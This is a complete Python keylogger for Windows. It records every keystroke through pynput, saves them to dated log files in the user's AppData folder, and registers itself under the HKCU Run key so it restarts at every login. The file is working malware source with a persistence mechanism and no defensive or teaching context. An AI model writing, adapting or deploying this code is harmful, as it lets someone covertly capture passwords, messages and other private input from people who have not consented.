from pynput.keyboard import Key, Listener
import logging
import os
import winreg as reg
import sys
import shutil
from datetime import datetime

class KeyLogger:
    def __init__(self):
        # Initialize the buffer to store keystrokes temporarily
        self.log_buffer = []

        # Set up the log file
        date_today = datetime.now().strftime('%Y-%m-%d')
        log_dir = os.path.join(os.getenv('APPDATA'), 'KeyLogs')  # C:/Users/<YourUsername>/AppData/Roaming/KeyLogs
        os.makedirs(log_dir, exist_ok=True)  # Create directory if it doesn't exist
        self.log_file = os.path.join(log_dir, f'log_{date_today}.key')
        
        # Ensure the log file exists
        with open(self.log_file, 'a') as f:
            pass  # Create the file if it doesn't exist
        
        print(f"Logging keystrokes to {self.log_file}")

    def log_key(self, key):
        """Log the pressed key to the buffer or file."""
        try:
            if key == Key.enter:
                # Write the buffer to the file when Enter is pressed
                with open(self.log_file, 'a') as f:
                    f.write(''.join(self.log_buffer) + '\n')  # Join buffer and write to file
                self.log_buffer = []  # Clear the buffer
            elif key == Key.space:
                self.log_buffer.append(' ')  # Add a space for the Space key
            elif hasattr(key, 'char') and key.char is not None:
                self.log_buffer.append(key.char)  
            else:
                self.log_buffer.append(f'[{key}]')  # Add special keys to the buffer
        except Exception as e:
            print(f"Error logging key: {e}")

    def start(self):
        """Start the keylogger."""
        with Listener(on_press=self.log_key) as listener:
            listener.join()

    def add_to_startup(self):
        # Path to the Python script
        script_path = os.path.abspath(sys.argv[0])
        
        # Add to Windows startup registry
        reg_key = reg.HKEY_CURRENT_USER
        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        reg_name = "MyKeylogger"
        
        try:
            registry = reg.OpenKey(reg_key, reg_path, 0, reg.KEY_WRITE)
            reg.SetValueEx(registry, reg_name, 0, reg.REG_SZ, script_path)
            reg.CloseKey(registry)
            print("Keylogger added to startup.")
        except Exception as e:
            print(f"Failed to add keylogger to startup: {e}")

# Main execution
if __name__ == "__main__":
    keylogger = KeyLogger()

    keylogger.add_to_startup()

    keylogger.start()
